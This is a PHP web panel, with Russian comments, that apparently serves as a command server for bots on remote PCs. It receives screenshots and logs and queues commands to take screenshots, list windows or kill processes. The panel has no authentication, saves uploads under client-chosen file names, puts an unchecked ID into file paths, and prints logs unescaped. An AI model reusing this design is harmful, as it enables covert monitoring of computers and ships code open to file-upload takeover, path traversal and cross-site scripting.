<?php
// Настройки папок
$imgDir = 'screenshots/';
if (!is_dir($imgDir)) mkdir($imgDir);

// 1. Прием скриншота от бота
if (isset($_FILES['screen'])) {
    move_uploaded_file($_FILES['screen']['tmp_name'], $imgDir . $_FILES['screen']['name']);
    echo "ok"; exit;
}

// 2. Прием текстового лога от бота
if (isset($_POST['log'])) {
    $pc_id = $_POST['pc_id'];
    file_put_contents("log_$pc_id.txt", $_POST['log']);
    echo "ok"; exit;
}

// 3. Бот спрашивает: "Есть команды?"
if (isset($_GET['get_cmd'])) {
    $pc_id = $_GET['pc_id'] ?? 'unknown';
    $file = "cmd_$pc_id.txt";
    echo file_exists($file) ? file_get_contents($file) : 'none';
    exit;
}

// 4. Бот говорит: "Команду выполнил"
if (isset($_GET['clear_cmd'])) {
    $pc_id = $_GET['pc_id'];
    file_put_contents("cmd_$pc_id.txt", 'none');
    echo "ok"; exit;
}

// 5. Установка команды с сайта
if (isset($_POST['set_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['set_cmd'];
    if ($cmd == 'delete') $cmd .= ' ' . ($_POST['proc_name'] ?? '');
    file_put_contents("cmd_$pc_id.txt", $cmd);
    header("Location: /"); exit;
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Control Panel</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; padding: 20px; }
        .pc-card { background: #1e293b; padding: 15px; margin: 10px; border-radius: 8px; border: 1px solid #334155; display: inline-block; vertical-align: top; width: 300px; }
        button { background: #6366f1; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; margin: 2px; }
        pre { background: #000; padding: 10px; border-radius: 4px; color: #38bdf8; font-size: 12px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>Панель управления ПК</h1>
    <?php 
    $pcs = ['PC-01', 'PC-02']; // Добавляй сюда ID своих ПК
    foreach($pcs as $pc) {
        $log = file_exists("log_$pc.txt") ? file_get_contents("log_$pc.txt") : "Лог пуст";
        echo "<div class='pc-card'>
                <h3>$pc</h3>
                <form method='POST'>
                    <input type='hidden' name='pc_id' value='$pc'>
                    <button name='set_cmd' value='screen'>📸 Скрин</button>
                    <button name='set_cmd' value='app'>📋 Окна</button>
                    <input type='text' name='proc_name' placeholder='Процесс' style='width:60px'>
                    <button name='set_cmd' value='delete'>❌ Kill</button>
                </form>
                <b>Лог:</b><pre>$log</pre>
              </div>";
    }
    ?>
    <h2>Галерея скриншотов</h2>
    <?php
    $files = glob("$imgDir*.jpg");
    rsort($files); // Свежие в начале
    foreach ($files as $file) {
        echo "<img src='$file' style='width:200px; margin:5px; border:2px solid #6366f1;'>";
    }
    ?>
</body>
</html>
